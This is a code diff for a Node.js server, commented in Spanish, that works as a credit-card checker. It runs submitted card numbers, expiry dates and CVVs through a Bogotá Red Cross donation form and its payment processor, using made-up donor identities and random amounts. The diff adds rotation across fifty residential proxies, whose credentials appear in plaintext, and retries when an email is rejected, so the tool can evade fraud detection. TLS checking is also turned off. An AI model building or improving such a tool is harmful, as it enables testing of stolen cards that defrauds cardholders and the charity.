@@ -17,11 +17,70 @@ app.use(express.static('public'));
 // Middleware para ignorar verificación SSL (SOLO DESARROLLO)
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 
-// Configuración del proxy agent Smartproxy (sticky 2 minutos)
-const proxyUrl = 'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30001';
+// Lista de proxies Smartproxy (puedes agregar/quitar según necesites)
+const proxyList = [
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30001',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30002',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30003',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30004',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30005',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30006',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30007',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30008',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30009',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30010',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30011',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30012',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30013',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30014',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30015',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30016',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30017',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30018',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30019',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30020',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30021',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30022',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30023',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30024',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30025',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30026',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30027',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30028',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30029',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30030',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30031',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30032',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30033',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30034',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30035',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30036',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30037',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30038',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30039',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30040',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30041',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30042',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30043',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30044',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30045',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30046',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30047',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30048',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30049',
+  'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30050'
+];
+
+// Función para obtener un proxy aleatorio
+function getRandomProxy() {
+  const idx = Math.floor(Math.random() * proxyList.length);
+  return proxyList[idx];
+}
+
+// Validar proxy al iniciar el servidor (puedes dejarlo así o también randomizar)
+const proxyUrl = getRandomProxy();
 const proxyAgent = new HttpsProxyAgent(proxyUrl);
 
-// Validar proxy al iniciar el servidor
 const url = 'https://ip.smartproxy.com/json';
 axios
   .get(url, {
@@ -108,31 +167,61 @@ app.post('/validate', async (req, res) => {
       throw new Error('Formato de tarjeta incorrecto. Use: NUMERO|MES|AÑO|CVV');
     }
 
+    // Ejemplo de request usando proxy aleatorio:
+    const proxyUrl = getRandomProxy();
+    const proxyAgent = new HttpsProxyAgent(proxyUrl);
+
     // Endpoint 1: Pixel Tracking
     addLog(logs, '🟡 Enviando a endpoint 1 (Pixel)...');
-    await sendPixelRequest(logs);
+    await sendPixelRequest(logs, proxyAgent);
 
     // OMITIDO: Endpoint 2 OPTIONS Preflight
 
     // Endpoint 3: GET Form Data (y extraer cookies)
     addLog(logs, '🟡 Enviando a endpoint 3 (GET Form)...');
-    const getFormResp = await getFormDataWithCookies(logs);
+    const getFormResp = await getFormDataWithCookies(logs, proxyAgent);
     cookies = getFormResp.cookies;
     addLog(logs, '🍪 Cookies obtenidas: ' + JSON.stringify(cookies));
 
     // Generar datos ficticios
-    const fakeUser = generateFakeUser();
     amount = randomAmount();
-    const phone = randomPhone();
 
-    // Endpoint 4: leadDonationStart
+    // Endpoint 4: leadDonationStart con reintentos si email inválido
     addLog(logs, '🟡 Enviando a endpoint 4 (leadDonationStart)...');
-    const leadDonationResp = await leadDonationStart({
-      cookies,
-      fakeUser,
-      amount,
-      phone
-    }, logs);
+    let leadDonationResp;
+    let fakeUser, phone;
+    let leadTries = 0;
+    let leadError = null;
+    do {
+      fakeUser = generateFakeUser();
+      phone = randomPhone();
+      try {
+        leadDonationResp = await leadDonationStart({
+          cookies,
+          fakeUser,
+          amount,
+          phone
+        }, logs, proxyAgent);
+        leadError = null;
+      } catch (err) {
+        leadError = err;
+        // Analiza si el error es por email inválido (422 y mensaje email_invalid)
+        if (
+          err.response &&
+          err.response.status === 422 &&
+          (err.response.data.message === 'email_invalid' ||
+            (err.response.data.errors && err.response.data.errors.email))
+        ) {
+          addLog(logs, `🔁 Email inválido, reintentando con otro...`);
+        } else {
+          throw err;
+        }
+      }
+      leadTries++;
+    } while (leadError && leadTries < 5);
+
+    if (leadError) throw leadError;
+
     cookies = leadDonationResp.cookies; // Actualizar cookies
     addLog(logs, '🍪 Cookies actualizadas (endpoint 4): ' + JSON.stringify(cookies));
     addLog(logs, '🔵 Respuesta endpoint 4: ' + JSON.stringify(leadDonationResp.data));
@@ -144,7 +233,7 @@ app.post('/validate', async (req, res) => {
       fakeUser,
       amount,
       phone
-    }, logs);
+    }, logs, proxyAgent);
     cookies = donationTokenResp.cookies; // Actualizar cookies
     paymentToken = donationTokenResp.token;
     addLog(logs, '🔵 Respuesta endpoint 5: ' + JSON.stringify(donationTokenResp.data));
@@ -157,7 +246,7 @@ app.post('/validate', async (req, res) => {
       month,
       year,
       cvv
-    }, logs);
+    }, logs, proxyAgent);
     uuid = paylandsResp.uuid;
     cardBrand = paylandsResp.brand;
     cardBrandDesc = paylandsResp.brand_description;
@@ -172,7 +261,7 @@ app.post('/validate', async (req, res) => {
       amount,
       phone,
       uuid
-    }, logs);
+    }, logs, proxyAgent);
     addLog(logs, '🔵 Respuesta endpoint 7: ' + JSON.stringify(donationFinalResp));
 
     addLog(logs, '✅ Validación completada con éxito');
@@ -209,7 +298,7 @@ app.post('/validate', async (req, res) => {
 
 // Funciones para los endpoints
 
-async function sendPixelRequest(logs) {
+async function sendPixelRequest(logs, proxyAgent) {
   try {
     const response = await axios.post(
       'https://donar.cruzrojabogota.org.co/wp-admin/admin-ajax.php',
@@ -248,7 +337,7 @@ async function sendPixelRequest(logs) {
 
 // OMITIDO: sendOptionsRequest
 
-async function getFormDataWithCookies(logs) {
+async function getFormDataWithCookies(logs, proxyAgent) {
   try {
     const response = await axios.get(
       'https://my.afrus.org/api/form/2d90b31c-4ac3-4bd8-9656-0de01743902f',
@@ -270,7 +359,7 @@ async function getFormDataWithCookies(logs) {
   }
 }
 
-async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs) {
+async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs, proxyAgent) {
   try {
     const response = await axios.post(
       'https://my.afrus.org/api/leadDonationStart',
@@ -331,7 +420,7 @@ async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs) {
   }
 }
 
-async function donationToken({ cookies, fakeUser, amount, phone }, logs) {
+async function donationToken({ cookies, fakeUser, amount, phone }, logs, proxyAgent) {
   try {
     const response = await axios.post(
       'https://my.afrus.org/api/donation',
@@ -396,7 +485,7 @@ async function donationToken({ cookies, fakeUser, amount, phone }, logs) {
   }
 }
 
-async function paylandsCardSave({ token, number, month, year, cvv }, logs) {
+async function paylandsCardSave({ token, number, month, year, cvv }, logs, proxyAgent) {
   try {
     const response = await axios.post(
       'https://api.paylands.com/v1/cards/save/frame',
@@ -432,7 +521,7 @@ async function paylandsCardSave({ token, number, month, year, cvv }, logs) {
   }
 }
 
-async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs) {
+async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs, proxyAgent) {
   try {
     const response = await axios.post(
       'https://my.afrus.org/api/donation',
